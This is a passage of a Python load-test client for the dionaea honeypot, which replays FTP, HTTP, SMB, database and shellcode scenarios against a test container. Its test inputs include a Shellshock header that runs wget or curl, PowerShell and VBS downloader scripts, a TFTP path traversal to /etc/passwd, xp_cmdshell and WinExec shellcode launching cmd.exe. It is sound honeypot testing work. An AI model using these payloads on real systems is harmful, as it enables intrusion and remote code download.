# This file is part of the dionaea honeypot
#
# SPDX-FileCopyrightText: none
#
# SPDX-License-Identifier: CC0-1.0

"""Client of the synthetic accelerated replay, runs in the client container (see README.md).

    python replay_client.py --duration SECONDS --concurrency 8 --idle 4

Loops over the benign scenarios of the functional tests, chosen at random by
weight, at a high rate for DURATION seconds. The protocol clients are the ones
of tests/functional (imported, not copied); downloads point at a TFTP and an HTTP
server in this container only. Beside the workers run a banner probe (FTP banner
every 0.5 s), idle / slow connections, a verifier that every upload ends in
binaries/<md5> and a sampler of the sqlite tables. Afterwards the client waits
until dionaea is quiet and checks that new connections and an upload still work.

Paths in the container: /tests (tests/functional, read-only), /work (tests/load,
read-only), /logs (dionaea's var/log, read-only), /data (var/dionaea, read-only),
/out (result.json, banner.csv, client.jsonl, phase.json). DIONAEA_HOST names the
server. The numbers go to /out/result.json; the host side (replay.py) judges them.
"""

import argparse
import collections
import hashlib
import json
import os
import random
import socket
import sqlite3
import ssl
import struct
import sys
import threading
import time
import traceback
import uuid
from pathlib import Path

for path in ("/tests", "/work"):
    if path not in sys.path:
        sys.path.insert(0, path)

HOST = os.environ.get("DIONAEA_HOST", "dionaea")
OUT = Path("/out")
LOG = Path("/logs")
DATA = Path("/data")
TIMEOUT = 15

import logformat  # noqa: E402
import smb1_raw  # noqa: E402
import test_emu  # noqa: E402
import test_ftp  # noqa: E402
import test_smb_auth  # noqa: E402
import test_smb_trans  # noqa: E402
import test_smoke  # noqa: E402
import test_tftp  # noqa: E402
from servers import HttpServer, TftpServer  # noqa: E402

from impacket.smb import SMB_DIALECT  # noqa: E402
from impacket.smbconnection import SMBConnection  # noqa: E402
import pymysql  # noqa: E402

STAMP = time.strftime("%H%M%S")


def now():
    return time.time()


# ---------------------------------------------------------------- samples and servers

def make_pool(seed, count=48):
    """Samples that come back again and again, like the binaries of a botnet (stored once, md5 known)."""
    rnd = random.Random(seed)
    pool = []
    for index in range(count):
        size = int(2 ** rnd.uniform(9, 17))  # 512 B .. 128 KiB
        pool.append(b"MZ\x90\x00pool-%d\n" % index + rnd.randbytes(size))
    return pool


class Content:
    """What the servers of this container hand out: files of the pool and payloads made from a token."""

    def __init__(self, pool, address):
        self.pool = pool
        self.address = address
        self.http_port = None

    def get(self, path, default=None):
        if path.startswith("/pool/"):
            try:
                return self.pool[int(path[6:].split(".")[0]) % len(self.pool)]
            except ValueError:
                return default
        if path.startswith("/u/"):
            return ("replay payload %s\n" % path[3:]).encode() * 24
        return default

    def script(self, name):
        """A PowerShell script (small, TFTP) whose URL emu_scripts follows to the HTTP server."""
        token = name.split("-", 1)[-1].split(".")[0]
        if name.startswith("script-ps"):
            return ("$wc = New-Object System.Net.WebClient\r\n"
                    "$url = \"http://%s:%d/u/%s\"\r\n"
                    "$wc.DownloadFile($url, \"c:\\\\windows\\\\temp\\\\x.exe\")\r\n"
                    % (self.address, self.http_port, token)).encode()
        if name.startswith("script-vbs"):
            return ("Set http = CreateObject(\"Msxml2.XMLHTTP\")\r\n"
                    "http.Open \"GET\", \"http://%s:%d/u/%s\", False\r\n"
                    "http.Send\r\n" % (self.address, self.http_port, token)).encode()
        return None


class TftpFiles:
    def __init__(self, content):
        self.content = content

    def get(self, name, default=None):
        script = self.content.script(name)
        return script if script is not None else default


class TrimmedHttpServer(HttpServer):
    """HttpServer of the functional tests; the lists of what it saw are kept short (a million requests)."""

    def __init__(self, files, address):
        super().__init__(files, address)
        self.count = 0
        self.requests = _CountingList(self)


class _CountingList(list):
    def __init__(self, owner):
        super().__init__()
        self.owner = owner

    def append(self, item):
        self.owner.count += 1
        if len(self) < 50:
            super().append(item)


class CountingTftp(TftpServer):
    def __init__(self, files, address):
        super().__init__(files, address)
        self.count = 0
        self.requests = _CountingTftpList(self)


class _CountingTftpList(list):
    def __init__(self, owner):
        super().__init__()
        self.owner = owner

    def append(self, item):
        self.owner.count += 1
        if len(self) < 50:
            super().append(item)


# ---------------------------------------------------------------- bookkeeping

class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.ok = collections.Counter()
        self.err = collections.Counter()
        self.errors = collections.defaultdict(list)
        self.connections = collections.Counter()   # TCP connections / UDP requests per scenario, as attempted
        self.seconds = collections.Counter()
        self.expected = []                         # (time, md5, size) of uploads that must be in binaries/
        self.upload_bytes = 0

    def done(self, name, ok, seconds, error=None):
        with self.lock:
            (self.ok if ok else self.err)[name] += 1
            self.seconds[name] += seconds
            if error is not None and len(self.errors[name]) < 12:
                self.errors[name].append(error)

    def expect(self, content):
        with self.lock:
            self.expected.append((now(), hashlib.md5(content).hexdigest(), len(content)))
            self.upload_bytes += len(content)


STATS = Stats()
CTX = threading.local()


def detail(text):
    """What the scenario is doing, for the message of a failure."""
    CTX.detail = str(text)[:80]


CONNECTIONS = {"count": 0}


def conn_count(number=1):
    # a rough count (threads add to it without a lock): used only for the plausibility range
    CONNECTIONS["count"] += number


def connect(port, timeout=TIMEOUT):
    conn_count()
    sock = socket.create_connection((HOST, port), timeout=timeout)
    sock.settimeout(timeout)
    return sock


def unique_sample(rnd, label):
    size = int(2 ** rnd.uniform(9, 16))
    return ("MZ\x90\x00%s %s\n" % (label, uuid.uuid4().hex)).encode() + rnd.randbytes(size)


UNIQUE_SHARE = float(os.environ.get("REPLAY_UNIQUE_SHARE", "0.15"))  # of the uploads: a sample never seen before


def sample(rnd, label):
    if rnd.random() < UNIQUE_SHARE:
        return unique_sample(rnd, label)
    return rnd.choice(POOL)


# ---------------------------------------------------------------- FTP

FTP_USERS = ["anonymous", "ftp", "admin", "root", "user", "test", "pi", "upload"]
FTP_PASSWORDS = ["ftp@", "admin", "123456", "password", "root", "test@example.org"]


def ftp_login(ctrl, rnd):
    assert test_ftp._read_reply(ctrl).startswith("220")
    user, password = rnd.choice(FTP_USERS), rnd.choice(FTP_PASSWORDS)
    detail("USER %s / PASS %r" % (user, password))
    assert test_ftp._command(ctrl, "USER " + user).startswith("331")
    reply = test_ftp._command(ctrl, "PASS " + password)
    assert reply.startswith("230"), reply


def ftp_session(rnd):
    """Login, a few commands, a transfer in passive mode, QUIT."""
    with connect(21) as ctrl:
        ftp_login(ctrl, rnd)
        commands = ["SYST", "PWD", "TYPE I", "FEAT", "NOOP", "CWD /", "HELP", "SIZE functional-list.txt", "TYPE A"]
        for command in rnd.sample(commands, rnd.randint(2, 6)):
            test_ftp._command(ctrl, command)
        kind = rnd.choice(["LIST", "RETR functional-list.txt", "none"])
        if kind != "none":
            with test_ftp._passive_data_socket(ctrl, HOST) as data_sock:
                conn_count()
                assert test_ftp._command(ctrl, kind).startswith("150")
                test_ftp._read_all(data_sock)
            assert test_ftp._read_reply(ctrl).startswith("226")
        test_ftp._command(ctrl, "QUIT")


def ftp_active_list(rnd):
    with connect(21) as ctrl:
        ftp_login(ctrl, rnd)
        my_ip = ctrl.getsockname()[0]
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
            listener.bind((my_ip, 0))
            listener.listen(1)
            listener.settimeout(TIMEOUT)
            port = listener.getsockname()[1]
            reply = test_ftp._command(ctrl, "PORT %s,%d,%d" % (my_ip.replace(".", ","), port >> 8, port & 255))
            assert reply.startswith("200"), reply
            data_sock, _ = listener.accept()
            conn_count()
            with data_sock:
                ctrl.sendall(b"LIST\r\n")
                data = test_ftp._read_all(data_sock)
            assert test_ftp._read_reply(ctrl).startswith("150")
            assert test_ftp._read_reply(ctrl).startswith("226")
        assert b"functional-list.txt" in data
        test_ftp._command(ctrl, "QUIT")


MALFORMED = ["PORT", "PORT x", "PORT 1,2,3", "PORT 1,2,3,4,5,300", "CWD", "SIZE", "RETR", "STOR"]


def ftp_malformed(rnd):
    """Commands that need an argument or a data connection, and MKD / RMD on the read-only root."""
    with connect(21) as ctrl:
        ftp_login(ctrl, rnd)
        for command in rnd.sample(MALFORMED, 3):
            reply = test_ftp._command(ctrl, command)
            assert reply.startswith("501"), (command, reply)
        for command in rnd.sample(["LIST", "RETR functional-list.txt", "STOR no-data.bin"], 1):
            reply = test_ftp._command(ctrl, command)
            assert reply.startswith("425"), (command, reply)
        reply = test_ftp._command(ctrl, rnd.choice(["MKD replay-%d" % rnd.randrange(100), "RMD /", "RMD x"]))
        assert reply.startswith("550"), reply
        assert test_ftp._command(ctrl, "PWD").startswith("257")
        test_ftp._command(ctrl, "QUIT")


def ftp_login_only(rnd):
    """USER / PASS without argument: 501, then a proper login (as test_ftp)."""
    with connect(21) as ctrl:
        assert test_ftp._read_reply(ctrl).startswith("220")
        assert test_ftp._command(ctrl, "USER").startswith("501")
        assert test_ftp._command(ctrl, "USER " + rnd.choice(FTP_USERS)).startswith("331")
        assert test_ftp._command(ctrl, "PASS").startswith("501")
        assert test_ftp._command(ctrl, "PASS " + rnd.choice(FTP_PASSWORDS)).startswith("230")


def ftp_stor(rnd):
    """STOR in passive or active mode: the upload is stored (binaries/<md5>)."""
    content = sample(rnd, "ftp")
    name = "stor-%s.bin" % uuid.uuid4().hex[:8]
    with connect(21) as ctrl:
        ftp_login(ctrl, rnd)
        if rnd.random() < 0.6:
            with test_ftp._passive_data_socket(ctrl, HOST) as data_sock:
                conn_count()
                assert test_ftp._command(ctrl, "STOR " + name).startswith("150")
                data_sock.sendall(content)
        else:
            my_ip = ctrl.getsockname()[0]
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
                listener.bind((my_ip, 0))
                listener.listen(1)
                listener.settimeout(TIMEOUT)
                port = listener.getsockname()[1]
                reply = test_ftp._command(ctrl, "PORT %s,%d,%d" % (my_ip.replace(".", ","), port >> 8, port & 255))
                assert reply.startswith("200"), reply
                data_sock, _ = listener.accept()
                conn_count()
                with data_sock:
                    ctrl.sendall(b"STOR " + name.encode() + b"\r\n")
                    assert test_ftp._read_reply(ctrl).startswith("150")
                    data_sock.sendall(content)
        assert test_ftp._read_reply(ctrl).startswith("226")
        test_ftp._command(ctrl, "QUIT")
    STATS.expect(content)


# ---------------------------------------------------------------- HTTP

HTTP_PATHS = ["/", "/index.html", "/admin", "/cgi-bin/status", "/wp-login.php", "/phpmyadmin/", "/robots.txt",
              "/.env", "/shell?cmd=id", "/does-not-exist-%d"]


def http_get(rnd):
    conn_count()
    path = rnd.choice(HTTP_PATHS)
    if "%d" in path:
        path = path % rnd.randrange(10 ** 6)
    with socket.create_connection((HOST, 81), timeout=TIMEOUT) as sock:
        sock.sendall(("GET %s HTTP/1.1\r\nHost: replay\r\nUser-Agent: Mozilla/5.0 (replay)\r\n"
                      "Connection: close\r\n\r\n" % path).encode())
        sock.settimeout(TIMEOUT)
        data = sock.recv(4096)
    assert data.startswith(b"HTTP/1."), data[:60]


def https_get(rnd):
    conn_count()
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.minimum_version = ssl.TLSVersion.TLSv1
    with socket.create_connection((HOST, 443), timeout=TIMEOUT) as raw:
        with context.wrap_socket(raw, server_hostname="replay") as sock:
            sock.sendall(b"GET / HTTP/1.1\r\nHost: replay\r\nConnection: close\r\n\r\n")
            assert sock.recv(4096).startswith(b"HTTP/1.")


def http_post_form(rnd):
    conn_count()
    body = ("user=%s&pass=%s" % (rnd.choice(FTP_USERS), rnd.choice(FTP_PASSWORDS))).encode()
    with socket.create_connection((HOST, 81), timeout=TIMEOUT) as sock:
        sock.sendall(b"POST /login.php HTTP/1.1\r\nHost: replay\r\nContent-Type: application/x-www-form-urlencoded\r\n"
                     b"Content-Length: %d\r\nConnection: close\r\n\r\n" % len(body) + body)
        sock.settimeout(TIMEOUT)
        assert sock.recv(4096).startswith(b"HTTP/1.")


def http_multipart(rnd):
    """A multipart upload: the file part is stored as sent."""
    content = sample(rnd, "http")
    boundary = "replay" + uuid.uuid4().hex
    body = (("--%s\r\nContent-Disposition: form-data; name=\"note\"\r\n\r\nhello\r\n" % boundary).encode()
            + test_smoke._file_part(boundary, content, "Content-Type: application/octet-stream\r\n")
            + ("--%s--\r\n" % boundary).encode())
    conn_count()
    response, _ = test_smoke._post_multipart(HOST, body, boundary, timeout=TIMEOUT)
    assert response.startswith(b"HTTP/1."), response[:80]
    STATS.expect(content)


def http_shellshock(rnd):
    """A download command in a header: dionaea follows the URL to the HTTP server of this container."""
    if rnd.random() < 0.5:
        url = "http://%s:%d/pool/%d.exe" % (CONTENT.address, CONTENT.http_port, rnd.randrange(len(POOL)))
    else:
        url = "http://%s:%d/u/%s" % (CONTENT.address, CONTENT.http_port, uuid.uuid4().hex[:16])
    tool = rnd.choice(["wget %s -O /tmp/x", "curl -o /tmp/x %s"])
    request = ("GET /cgi-bin/status HTTP/1.1\r\nHost: %s\r\nUser-Agent: () { :;}; /bin/bash -c '%s'\r\n"
               "Connection: close\r\n\r\n" % (HOST, tool % url)).encode()
    conn_count()
    with socket.create_connection((HOST, 81), timeout=TIMEOUT) as sock:
        sock.sendall(request)
        sock.settimeout(TIMEOUT)
        assert sock.recv(4096).startswith(b"HTTP/1.1 ")
    if url.split("/")[3] == "pool":
        STATS.expect(POOL[int(url.rsplit("/", 1)[1].split(".")[0])])


# ---------------------------------------------------------------- TFTP

def tftp_rrq(rnd):
    conn_count()
    kind = rnd.choice(["ok", "ok", "missing", "outside"])
    if kind == "ok":
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(TIMEOUT)
            sock.sendto(test_tftp._rrq(b"functional-test.txt"), (HOST, 69))
            reply, peer = sock.recvfrom(4096)
            assert struct.unpack("!HH", reply[:4]) == (3, 1) and reply[4:] == test_tftp.EXPECTED, reply
            sock.sendto(struct.pack("!HH", 4, 1), peer)
        return
    name = b"does-not-exist-%d.bin" % rnd.randrange(10 ** 6) if kind == "missing" else b"../../../../etc/passwd"
    reply, _ = test_tftp._request(HOST, test_tftp._rrq(name), timeout=TIMEOUT)
    assert struct.unpack("!HH", reply[:4]) == (5, 1 if kind == "missing" else 2), reply


# ---------------------------------------------------------------- SMB

def smb1_login(rnd):
    """NT LM 0.12, NTLM or legacy password (as test_smb_auth), tree connect to IPC$."""
    conn_count()
    conn = SMBConnection(HOST, HOST, sess_port=445, preferredDialect=SMB_DIALECT, timeout=TIMEOUT)
    try:
        if rnd.random() < 0.3:
            from impacket.smb import SMB
            conn.getSMBServer()._dialects_parameters["Capabilities"] &= ~SMB.CAP_EXTENDED_SECURITY
        conn.login(rnd.choice(["Administrator", "admin", "guest", "user%d" % rnd.randrange(50)]),
                   rnd.choice(["", "password", "123456", "a" * 24]), rnd.choice(["WORKGROUP", "DOMAIN", ""]))
        assert conn.connectTree("IPC$")
    finally:
        conn.close()


def smb1_upload(rnd):
    """Login, write a file to C$ in pieces: stored as binaries/<md5>, the emu scans the stream behind smbd."""
    if rnd.random() < 0.15:
        # x86-like data costs the emu about 0.5 MB/s: a small piece only
        import client
        content = client.x86_like(64 * 1024, seed=rnd.randrange(1000)) + uuid.uuid4().hex.encode()
    else:
        content = sample(rnd, "smb")
    conn_count()
    conn = SMBConnection(HOST, HOST, sess_port=445, preferredDialect=SMB_DIALECT, timeout=TIMEOUT * 2)
    try:
        conn.login("replay", "secret")
        tid = conn.connectTree("C$")
        fid = conn.createFile(tid, "\\replay-%s.bin" % uuid.uuid4().hex[:8])
        for offset in range(0, len(content), 60000):
            conn.writeFile(tid, fid, content[offset:offset + 60000], offset)
        conn.closeFile(tid, fid)
    finally:
        conn.close()
    STATS.expect(content)


def smb2_raw(rnd):
    """NEGOTIATE (0x0202 / 0x0210) and SESSION_SETUP with NTLMSSP v1 / v2 up to STATUS_LOGON_FAILURE."""
    from impacket import ntlm
    use_v2 = rnd.random() < 0.5
    dialect = rnd.choice([0x0202, 0x0210])
    with test_smb_auth.connect(HOST) as sock:
        conn_count()
        sock.sendall(test_smb_auth.negotiate((dialect,)))
        test_smb_auth.receive(sock)
        type1 = ntlm.getNTLMSSPType1("CLIENT%d" % rnd.randrange(20), "DOMAIN", use_ntlmv2=use_v2)
        sock.sendall(test_smb_auth.setup(type1.getData()))
        reply = test_smb_auth.receive(sock)
        assert struct.unpack_from("<I", reply, 8)[0] == test_smb_auth.MORE_PROCESSING
        sid = struct.unpack_from("<Q", reply, 40)[0]
        offset, length = struct.unpack_from("<HH", reply, 68)
        challenge = reply[offset:offset + length]
        type3, _ = ntlm.getNTLMSSPType3(type1, challenge, rnd.choice(["Administrator", "raw-user"]), "secret",
                                        "DOMAIN", use_ntlmv2=use_v2)
        sock.sendall(test_smb_auth.setup(type3.getData(), sid, 2))
        reply = test_smb_auth.receive(sock)
        assert struct.unpack_from("<I", reply, 8)[0] == test_smb_auth.LOGON_FAILURE


def smb2_impacket(rnd):
    from impacket.smbconnection import SessionError
    conn_count()
    conn = SMBConnection(HOST, HOST, sess_port=445, preferredDialect=rnd.choice([0x0202, 0x0210]), timeout=TIMEOUT)
    try:
        try:
            conn.login("smb2-user", "secret", "DOMAIN")
        except SessionError as error:
            assert error.getErrorCode() == test_smb_auth.LOGON_FAILURE
    finally:
        conn.close()


def smb_trans(rnd):
    """TRANSACTION / TRANSACTION2 / NT_TRANSACT with their *_SECONDARY requests (MS17-010 flows)."""
    conn_count()
    session = smb1_raw.Raw(HOST)
    try:
        primary_kind = rnd.choice(sorted(test_smb_trans.PRIMARIES))
        secondary_kind = rnd.choice(test_smb_trans.SECONDARIES)
        stream = session.message(primary_kind, 11, test_smb_trans.PRIMARIES[primary_kind]())
        for displacement in (70, 40, 0):
            stream += session.message(secondary_kind, 11, test_smb_trans.secondary(
                secondary_kind, 4, 100, b"", b"B" * 30, 0, displacement))
        replies = session.replies(stream)
        assert all(r[1] == smb1_raw.STATUS_SUCCESS for r in replies), replies
        # a secondary without a transaction on a new connection is an error, the session goes on
    finally:
        session.close()


def smb_orphan_secondary(rnd):
    conn_count()
    session = smb1_raw.Raw(HOST)
    try:
        kind = rnd.choice(test_smb_trans.SECONDARIES)
        replies = session.replies(session.message(kind, 0x1234, test_smb_trans.secondary(
            kind, 4, 100, b"", b"B" * 60, 0, 40)))
        assert replies == [(kind, smb1_raw.STATUS_INVALID_PARAMETER, 0x1234)], replies
    finally:
        session.close()


# ---------------------------------------------------------------- databases and message brokers

MYSQL_QUERIES = ["SET @v1 = 2", "set names utf8", "select database()", "show databases", "show tables",
                 "show variables like 'version%'", "select @@version", "select 1 as one"]
MYSQL_DENIED = ["ATTACH DATABASE '/tmp/x' AS capture", "VACUUM INTO '/tmp/x'", "SELECT load_extension('/tmp/x')"]


def mysql_session(rnd):
    conn_count()
    cnx = pymysql.connect(user=rnd.choice(["root", "admin", "mysql"]), host=HOST, port=3306,
                          connect_timeout=TIMEOUT, read_timeout=TIMEOUT)
    try:
        cursor = cnx.cursor()
        for query in rnd.sample(MYSQL_QUERIES, rnd.randint(2, 5)):
            detail(query)
            cursor.execute(query)
            cursor.fetchall()
        choice = rnd.random()
        if choice < 0.2:
            # hex data into a dumpfile is stored
            data = sample(rnd, "mysql")
            try:
                cursor.execute("select unhex('%s') into dumpfile '/tmp/x.bin'" % data.hex())
            except pymysql.err.MySQLError:
                pass
            STATS.expect(data)
        elif choice < 0.4:
            url = "http://%s:%d/u/%s" % (CONTENT.address, CONTENT.http_port, uuid.uuid4().hex[:16])
            try:
                cursor.execute("select xpdl3('%s') into dumpfile 'x'" % url)
            except pymysql.err.MySQLError:
                pass
        elif choice < 0.5:
            # an internal URL: the download policy refuses it
            try:
                cursor.execute("select xpdl3('http://127.0.0.1:81/blocked-%s') into dumpfile 'x'" % uuid.uuid4().hex)
            except pymysql.err.MySQLError:
                pass
        elif choice < 0.65:
            try:
                cursor.execute(rnd.choice(MYSQL_DENIED))
                raise AssertionError("a filesystem statement was accepted")
            except pymysql.err.MySQLError:
                pass
            cursor.execute("select 1")
            cursor.fetchall()
    finally:
        try:
            cnx.close()
        except Exception:
            pass


def mssql_session(rnd):
    from impacket import tds

    class PlainMSSQL(tds.MSSQL):
        def set_tls_context(self):
            pass

    conn_count()
    ms = PlainMSSQL(HOST, 1433)
    try:
        ms.connect()
        try:
            ms.login(None, rnd.choice(["sa", "admin", "reference"]), rnd.choice(["", "password", "secret"]))
        except Exception:
            return  # dionaea answers a login with an error: the connection was logged
        queries = ["select @@version", "select 1", "exec xp_cmdshell 'whoami'", "select name from sysdatabases"]
        for query in rnd.sample(queries, rnd.randint(1, 3)):
            try:
                ms.sql_query(query)
            except Exception:
                break
    finally:
        try:
            ms.disconnect()
        except Exception:
            pass


def mqtt_session(rnd):
    clientid, user, password = [("replay-%d" % rnd.randrange(1000)).encode(), b"admin", b"secret"]
    payload = b"".join(struct.pack("!H", len(item)) + item for item in (clientid, user, password))
    body = b"\x00\x04MQTT\x04" + bytes([0xC2]) + struct.pack("!H", 60) + payload
    with connect(1883) as sock:
        sock.sendall(b"\x10" + bytes([len(body)]) + body)
        logformat._recv_some(sock)
        topic = b"sensors/%d" % rnd.randrange(100)
        if rnd.random() < 0.5:
            sock.sendall(b"\x30" + bytes([2 + len(topic) + 5]) + struct.pack("!H", len(topic)) + topic + b"hello")
        else:
            sock.sendall(b"\x82" + bytes([2 + 2 + len(topic) + 1]) + struct.pack("!H", 1)
                         + struct.pack("!H", len(topic)) + topic + b"\x00")
            logformat._recv_some(sock, timeout=2)
        sock.sendall(b"\xe0\x00")


def mongo_session(rnd):
    document = b"\x10isMaster\x00" + struct.pack("<i", 1) + b"\x00"
    document = struct.pack("<i", 4 + len(document)) + document
    query = struct.pack("<i", 0) + b"admin.$cmd\x00" + struct.pack("<ii", 0, -1) + document
    message = struct.pack("<iiii", 16 + len(query), rnd.randrange(1 << 20), 0, 2004) + query
    with connect(27017) as sock:
        sock.sendall(message)
        try:
            sock.recv(4096)
        except OSError:
            pass


def epmap_session(rnd):
    conn_count()
    logformat._session_epmap(HOST, set())


# ---------------------------------------------------------------- emu

def shellcode_command(rnd, marker):
    return ("cmd.exe /c echo %s" % marker).encode()


def emu_shellcode(rnd):
    """The shellcode of the functional tests on 445 and 135: detected, emulated, profiled."""
    marker = "replay-%s" % uuid.uuid4().hex[:12]
    port = rnd.choice([445, 135])
    kind = rnd.random()
    if kind < 0.45:
        payload = test_emu.winexec_shellcode(shellcode_command(rnd, marker))
    elif kind < 0.8:
        payload = test_emu.pe_resolved_winexec_shellcode(shellcode_command(rnd, marker))
    elif kind < 0.9:
        # no GetPC: not profiled
        payload = b"\x90" * 6 + test_emu.winexec_shellcode(shellcode_command(rnd, marker))[6:]
    else:
        # behind two or three scan windows of NetBIOS frames smbd ignores
        port = 445
        windows = rnd.choice([1, 2, 3])
        shellcode = test_emu.winexec_shellcode(shellcode_command(rnd, marker))
        at = windows * test_emu.SCAN_WINDOW + 1234
        payload = test_emu.nbt_stream(at + 4096, shellcode, at)
    with connect(port) as sock:
        sock.sendall(payload)
        time.sleep(rnd.uniform(0.1, 0.4))


def emu_chain(rnd):
    """Shellcode -> cmd.exe tftp GET of a script (TFTP server here) -> URL in the script -> HTTP download."""
    kind = rnd.choice(["ps", "vbs"])
    name = "script-%s-%s.txt" % (kind, uuid.uuid4().hex[:12])
    command = "cmd.exe /c tftp -i %s GET %s" % (CONTENT.address, name)
    with connect(445) as sock:
        sock.sendall(test_emu.winexec_shellcode(command.encode()))
        time.sleep(rnd.uniform(0.2, 0.5))


# ---------------------------------------------------------------- mirror, idle, slow

MIRROR = {"connect_backs": 0, "listener": None}


def mirror_listener(stop):
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind(("", 42))
    listener.listen(16)
    listener.settimeout(0.5)
    while not stop.is_set():
        try:
            conn, _ = listener.accept()
        except socket.timeout:
            continue
        MIRROR["connect_backs"] += 1
        conn.close()
    listener.close()


def mirror_session(rnd):
    with connect(42) as sock:
        sock.sendall(b"mirror me %d\n" % rnd.randrange(10 ** 6))
        sock.settimeout(0.3)
        try:
            data = sock.recv(100)
            assert data == b"", "mirrored data came back: %r" % data
        except socket.timeout:
            pass
        except ConnectionError:
            pass


SCAN_PORTS = [21, 42, 81, 135, 443, 445, 1433, 1723, 1883, 3306, 27017]


def scan_connect(rnd):
    """A port scan: connect and close, or reset (SO_LINGER 0)."""
    port = rnd.choice(SCAN_PORTS)
    with connect(port) as sock:
        if rnd.random() < 0.5:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))


def idle_connection(rnd):
    port = rnd.choice(SCAN_PORTS)
    with connect(port):
        time.sleep(rnd.uniform(3, 25))


def slow_connection(rnd):
    """A request in single bytes, a few per second."""
    kind = rnd.choice(["ftp", "http", "smb"])
    port, data = {
        "ftp": (21, b"USER slow-%d\r\nPASS x\r\n" % rnd.randrange(100)),
        "http": (81, b"GET /slow HTTP/1.1\r\nHost: slow\r\nUser-Agent: slow\r\nConnection: close\r\n\r\n"),
        "smb": (445, b"\x00\x00\x00\x2f\xffSMBr\x00\x00\x00\x00\x18\x01\x28" + b"\x00" * 30),
    }[kind]
    with connect(port) as sock:
        for byte in data:
            sock.sendall(bytes([byte]))
            time.sleep(rnd.uniform(0.1, 0.5))
        time.sleep(1)


# ---------------------------------------------------------------- the mix

SCENARIOS = [
    # name, weight, function
    ("ftp_session", 10, ftp_session),
    ("ftp_active_list", 3, ftp_active_list),
    ("ftp_malformed", 6, ftp_malformed),
    ("ftp_login_only", 2, ftp_login_only),
    ("ftp_stor", 8, ftp_stor),
    ("http_get", 8, http_get),
    ("https_get", 2, https_get),
    ("http_post_form", 3, http_post_form),
    ("http_multipart", 5, http_multipart),
    ("http_shellshock", 4, http_shellshock),
    ("tftp_rrq", 5, tftp_rrq),
    ("smb1_login", 7, smb1_login),
    ("smb1_upload", 4, smb1_upload),
    ("smb2_raw", 5, smb2_raw),
    ("smb2_impacket", 2, smb2_impacket),
    ("smb_trans", 4, smb_trans),
    ("smb_orphan_secondary", 1, smb_orphan_secondary),
    ("mysql_session", 6, mysql_session),
    ("mssql_session", 4, mssql_session),
    ("mqtt_session", 3, mqtt_session),
    ("mongo_session", 2, mongo_session),
    ("epmap_session", 3, epmap_session),
    ("emu_shellcode", 7, emu_shellcode),
    ("emu_chain", 2, emu_chain),
    ("mirror_session", 3, mirror_session),
    ("scan_connect", 6, scan_connect),
]
BACKGROUND = [("idle_connection", idle_connection), ("slow_connection", slow_connection)]
NAMES = [name for name, _, _ in SCENARIOS]
WEIGHTS = [weight for _, weight, _ in SCENARIOS]
FUNCTIONS = {name: function for name, _, function in SCENARIOS}
FUNCTIONS.update(dict(BACKGROUND))

POOL = []
CONTENT = None


def run_scenario(name, rnd):
    begin = time.monotonic()
    CTX.detail = ""
    try:
        FUNCTIONS[name](rnd)
    except Exception as error:
        frame = traceback.extract_tb(error.__traceback__)[-1]
        text = "%s: %s [%s:%d %s]" % (type(error).__name__, str(error)[:150], frame.name, frame.lineno,
                                      getattr(CTX, "detail", ""))
        if os.environ.get("REPLAY_TRACE"):
            traceback.print_exc()
        STATS.done(name, False, time.monotonic() - begin, text)
        return False
    STATS.done(name, True, time.monotonic() - begin)
    return True


def worker(index, seed, end, think, stop):
    rnd = random.Random(seed * 1000 + index)
    while time.monotonic() < end and not stop.is_set():
        run_scenario(rnd.choices(NAMES, WEIGHTS)[0], rnd)
        if think:
            time.sleep(rnd.uniform(0, 2 * think))


def background(index, seed, end, stop):
    rnd = random.Random(seed * 1000 + 500 + index)
    while time.monotonic() < end and not stop.is_set():
        run_scenario(rnd.choice(["idle_connection", "slow_connection"]), rnd)


# ---------------------------------------------------------------- observers

def banner(timeout=10):
    begin = time.monotonic()
    with socket.create_connection((HOST, 21), timeout=timeout) as sock:
        sock.settimeout(timeout)
        data = sock.recv(64)
    assert data.startswith(b"220"), data
    return time.monotonic() - begin


def banner_probe(stop, state):
    """FTP banner every 0.5 s: dionaea's event loop answers while the load runs."""
    with (OUT / "banner.csv").open("w") as out:
        out.write("epoch,latency_s,error\n")
        last_flush = time.monotonic()
        while not stop.is_set():
            at = now()
            try:
                value, error = banner(), ""
            except Exception as exc:
                value, error = 10.0, type(exc).__name__
            out.write("%.3f,%.4f,%s\n" % (at, value, error))
            if time.monotonic() - last_flush > 5:
                out.flush()
                last_flush = time.monotonic()
            stop.wait(0.5)


def sqlite_counts():
    """max(rowid) of the tables (no locks: a shared lock of a reader made log_sqlite fail to commit)."""
    for _attempt in range(5):
        try:
            with sqlite3.connect("file:%s?mode=ro&immutable=1" % (LOG / "dionaea.sqlite"), uri=True, timeout=5) as db:
                return {table: db.execute("SELECT coalesce(max(rowid), 0) FROM %s" % table).fetchone()[0]
                        for table in ("connections", "logins", "downloads", "offers", "emu_profiles")}
        except sqlite3.DatabaseError:
            time.sleep(0.5)
    return None


def binaries_size():
    count = size = 0
    with os.scandir(DATA / "binaries") as entries:
        for entry in entries:
            try:
                # the samples, not the folder of the temporary files (.incoming)
                if not entry.is_file(follow_symlinks=False):
                    continue
                info = entry.stat()
            except OSError:
                continue
            count += 1
            size += info.st_size
    return count, size


def sampler(stop, interval, state):
    """What the client sees of the data every INTERVAL seconds (dionaea itself is sampled by the host)."""
    with (OUT / "client.jsonl").open("w") as out:
        while not stop.wait(interval):
            count, size = binaries_size()
            row = {"epoch": now(), "sqlite": sqlite_counts(), "binaries": count, "binaries_bytes": size,
                   "json_bytes": (LOG / "dionaea.json").stat().st_size if (LOG / "dionaea.json").exists() else 0,
                   "connections_made": CONNECTIONS["count"]}
            with STATS.lock:
                row["scenarios_ok"] = sum(STATS.ok.values())
                row["scenarios_err"] = sum(STATS.err.values())
            out.write(json.dumps(row) + "\n")
            out.flush()


def verify_expected(grace=60):
    """Uploads older than GRACE seconds must be in binaries/<md5>, read-only. Returns (checked, missing)."""
    with STATS.lock:
